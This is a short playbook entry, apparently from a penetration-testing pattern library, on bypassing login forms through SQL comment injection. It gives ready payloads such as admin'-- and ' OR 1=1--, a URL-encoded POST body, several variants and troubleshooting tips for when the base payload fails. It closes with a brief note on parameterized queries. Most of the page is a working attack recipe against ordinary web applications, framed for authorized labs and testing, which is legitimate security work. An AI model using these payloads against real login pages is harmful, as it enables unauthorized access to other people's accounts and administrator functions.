# Login Comment Auth Bypass

## Context

Use this pattern only in authorized labs, owned apps, in-scope targets, or defensive verification.

This applies when:

- Login SQL is built with string concatenation.
- Input appears inside single-quoted string literals.
- The application reflects the final SQL query or returns syntax errors that confirm interpolation.
- A known username such as `admin` exists but the password is unknown.

## Payload Pattern

Form fields:

```text
username=admin'--
password=x
```

URL-encoded POST body:

```text
username=admin%27--&password=x
```

## Example Query Shape

If the application builds:

```sql
SELECT username, role, display_name AS displayName
FROM users
WHERE username = '<username>' AND password = '<password>'
```

the payload aims to produce:

```sql
SELECT username, role, display_name AS displayName
FROM users
WHERE username = 'admin'--' AND password = 'x'
```

## Why It Works

- `'` closes the username string literal.
- `admin` becomes the effective username comparison value.
- `--` comments out the password predicate and trailing syntax.

## Expected Signal

- Login succeeds without the real password.
- Response shows the targeted account identity or role.
- Admin-only content appears when targeting an administrator username.

## Variants To Try If The Base Payload Fails

Test only after confirming the quoted-string context:

```text
admin'#
admin'-- -
admin'/*
' OR '1'='1'--
' OR 1=1--
```

Also test the same patterns in the password field if the username field is sanitized but password is not.

## Common Mistakes

- Starting with UNION payloads before confirming column count and injectable context.
- Injecting into the wrong field when only one input reaches SQL unsafely.
- Forgetting database-specific comment syntax (`--` often needs a trailing space in MySQL).
- Treating a syntax error as failure instead of evidence that quotes are reaching SQL.

## Safe Fix

- Parameterize the login query.
- Do not embed raw passwords in SQL strings.
- Add negative tests for comment and quote characters in both login fields.
